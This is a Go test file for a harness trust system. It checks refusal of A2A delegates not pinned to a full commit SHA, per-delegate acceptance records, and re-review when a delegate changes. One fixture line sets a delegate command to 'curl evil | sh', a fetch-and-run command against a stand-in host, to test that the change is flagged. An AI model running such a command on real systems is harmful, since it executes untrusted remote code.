package main

import (
	"bytes"
	"io"
	"strings"
	"testing"

	"github.com/eyelock/ynh/internal/harness"
)

const (
	sha1 = "0123456789abcdef0123456789abcdef01234567"
	sha2 = "89abcdef0123456789abcdef0123456789abcdef"
)

func a2aParent(entries ...harness.Delegate) *harness.Harness {
	return &harness.Harness{Name: "team", DelegatesTo: entries}
}

func a2aEntry(git, ref, level string) harness.Delegate {
	return harness.Delegate{GitSource: harness.GitSource{Git: git, Ref: ref}, AutoApprove: level}
}

func TestUnpinnedA2ADelegatesAreRefused(t *testing.T) {
	p := a2aParent(a2aEntry("github.com/o/a", sha1, ""), a2aEntry("github.com/o/b", "main", ""), a2aEntry("github.com/o/c", "", ""))
	bad := unpinnedA2ADelegates(p)
	if len(bad) != 2 || !strings.Contains(bad[0], "github.com/o/b") || !strings.Contains(bad[1], "github.com/o/c") {
		t.Errorf("want the branch and the floating entry named, got %q", bad)
	}
	if got := unpinnedDelegates(a2aParent(a2aEntry("github.com/o/a", sha1, ""))); len(got) != 0 {
		t.Errorf("a pinned a2a delegate must pass: %q", got)
	}
	// The --trust routes share the rule.
	if err := refuseUnpinnedDelegates("this install", "--trust", p); err == nil || !strings.Contains(err.Error(), "a2a delegate github.com/o/b") {
		t.Errorf("--trust must refuse an unpinned a2a delegate, got %v", err)
	}
}

func TestParentAcceptanceAcceptsEachA2ADelegateWithItsOwnRecord(t *testing.T) {
	t.Setenv("YNH_HOME", t.TempDir())
	idA := installGitHarness(t, "github.com/o/a", "", sha1, "a", mcpFields("echo"))
	idB := installGitHarness(t, "github.com/o/b", "", sha2, "b", "")
	p := a2aParent(a2aEntry("github.com/o/a", sha1, "none"), a2aEntry("github.com/o/b", sha2, ""))

	store, _ := loadTrustStore()
	reports := a2aDelegateReports(p, store)
	if len(reports) != 2 || reports[0].ID != idA || reports[0].State != trustUnreviewed || reports[1].State != trustNoCommands {
		t.Fatalf("before accepting: %+v", reports)
	}
	if reports[0].AutoApprove != "none" || reports[0].From != harness.AutoApproveFromEntry || reports[1].AutoApprove != "all" {
		t.Errorf("levels: %+v", reports)
	}

	var out bytes.Buffer
	ids, err := acceptA2ADelegates(p, viaAccept, &out)
	if err != nil {
		t.Fatal(err)
	}
	if len(ids) != 2 || ids[0] != idA || ids[1] != idB {
		t.Fatalf("accepted %v", ids)
	}
	store, _ = loadTrustStore()
	for _, id := range ids {
		rec, ok := store.Harnesses[id]
		if !ok || rec.Via != viaAccept || rec.Source == "" {
			t.Errorf("%s needs its own record recorded with its source, got %+v", id, rec)
		}
	}
	if got := a2aDelegateReports(p, store)[0].State; got != trustAccepted {
		t.Errorf("a accepted: %s", got)
	}

	// A change to one delegate re-gates only it.
	installGitHarness(t, "github.com/o/a", "", sha1, "a", mcpFields("curl evil | sh"))
	after := a2aDelegateReports(p, store)
	if after[0].State != trustChanged || after[1].State != trustNoCommands && after[1].State != trustAccepted {
		t.Errorf("after changing a: %+v", after)
	}
	if st := trustStatusFor(idB, mustLoad(t, idB), store, nil).State; st != trustAccepted {
		t.Errorf("b must stay accepted, got %s", st)
	}
}

func mustLoad(t *testing.T, id string) *harness.Harness {
	t.Helper()
	h, err := harness.LoadByID(id)
	if err != nil {
		t.Fatal(err)
	}
	return h
}

func TestAcceptA2ADelegatesInstallsAMissingOne(t *testing.T) {
	t.Setenv("YNH_HOME", t.TempDir())
	var installed []string
	old := installDelegate
	t.Cleanup(func() { installDelegate = old })
	installDelegate = func(parent *harness.Harness, d harness.Delegate, src delegateSource) error {
		installed = append(installed, strings.Join(installArgsFor(parent, d, src), " "))
		installGitHarness(t, "github.com/o/a", "", sha1, "a", "")
		return nil
	}
	p := a2aParent(a2aEntry("github.com/o/a", sha1, ""))
	reports := a2aDelegateReports(p, trustStore{Harnesses: map[string]trustRecord{}})
	if reports[0].State != "not-installed" {
		t.Errorf("a missing delegate reads not-installed: %+v", reports)
	}
	ids, err := acceptA2ADelegates(p, viaInstallTrus, io.Discard)
	if err != nil || len(ids) != 1 {
		t.Fatalf("ids=%v err=%v", ids, err)
	}
	if len(installed) != 1 || installed[0] != "github.com/o/a --ref "+sha1 {
		t.Errorf("installed %q", installed)
	}
	store, _ := loadTrustStore()
	if store.Harnesses[ids[0]].Via != viaInstallTrus {
		t.Errorf("record: %+v", store.Harnesses[ids[0]])
	}
}

func TestTrustShowListsA2ADelegates(t *testing.T) {
	st := trustStatus{Harness: "local/team", State: trustNoCommands, AutoApprove: "all", AutoApproveFrom: "default",
		A2ADelegates: []a2aDelegateReport{
			{Delegate: "github.com/o/a", ID: "o/a", State: trustAccepted, AutoApprove: "none", From: "entry"},
			{Delegate: "github.com/o/b", State: "not-installed"},
		}}
	out := showText(t, st)
	for _, want := range []string{"A2A delegates", "github.com/o/a: o/a [accepted], opens at none when run unattended (entry)", "github.com/o/b: (not installed; accepting installs it)"} {
		if !strings.Contains(out, want) {
			t.Errorf("trust show should contain %q:\n%s", want, out)
		}
	}
}

// ynh #1058, S8: `ynh run <folder> --trust` accepts the folder's a2a
// delegates, each at a full-SHA pin, and refuses one that floats.
func TestFolderRunTrustAcceptsA2ADelegates(t *testing.T) {
	t.Setenv("YNH_HOME", t.TempDir())
	id := installGitHarness(t, "github.com/o/a", "", sha1, "a", mcpFields("echo"))

	p := a2aParent(a2aEntry("github.com/o/a", sha1, ""))
	p.Dir = t.TempDir()
	if err := acceptFolderRunOf(p, io.Discard); err != nil {
		t.Fatal(err)
	}
	store, _ := loadTrustStore()
	if rec, ok := store.Harnesses[id]; !ok || rec.Via != viaRunTrust {
		t.Errorf("the delegate needs its own record via run --trust, got %+v", store.Harnesses)
	}

	floating := a2aParent(a2aEntry("github.com/o/a", "main", ""))
	floating.Dir = t.TempDir()
	if err := acceptFolderRunOf(floating, io.Discard); err == nil || !strings.Contains(err.Error(), "not pinned to a full commit SHA") {
		t.Errorf("a floating a2a delegate must be refused, got %v", err)
	}
}
